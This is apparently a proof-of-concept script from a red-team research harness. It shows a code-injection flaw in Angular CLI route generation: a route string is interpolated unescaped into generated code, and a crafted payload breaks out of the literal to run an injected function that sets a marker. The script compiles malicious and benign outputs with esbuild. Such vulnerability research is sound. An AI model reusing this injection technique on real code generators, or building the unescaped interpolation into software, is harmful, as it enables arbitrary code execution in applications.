// D1 buildRoute replication (module-index.ts:129-136 verbatim shape)
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';
const require_ = createRequire(import.meta.url);
const esbuildPath = require_.resolve('esbuild/lib/main.js', {
  paths: ['/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli'],
});
const { transformSync } = await import('file://' + esbuildPath);

function buildRoute(route, modulePath) {
  const relativeModulePath = './admin/admin.module';
  const moduleName = 'AdminModule';
  const loadChildren = `() => import('${relativeModulePath}').then(m => m.${moduleName})`;
  return `{ path: '${route}', loadChildren: ${loadChildren} }`;
}

function generateModule(route, outFile, marker) {
  const routeEntry = buildRoute(route, 'app.module.ts');
  const source = `import { Routes } from '@angular/router';\nconst routes: Routes = [\n  ${routeEntry}\n];\nexport default routes;\n`;
  const compiled = transformSync(source, { loader: 'ts', format: 'esm' });
  writeFileSync(outFile, compiled.code);
  return source;
}

// Malicious route: comma-exec payload (KP-E10 corrected shape)
const payload = "x' }, { path: 'y', loadChildren: (() => { (globalThis).__pwned = 'D1-SSR-RUNTIME-MARKER'; return () => import('./y/y.module'); })() }, { path: '";
generateModule(payload, 'routes-malicious.mjs', 'D1-SSR-RUNTIME-MARKER');

// Benign route (negative control)
generateModule('dashboard', 'routes-benign.mjs', null);
console.log('generated: routes-malicious.mjs + routes-benign.mjs (esbuild compiled, 0 errors)');
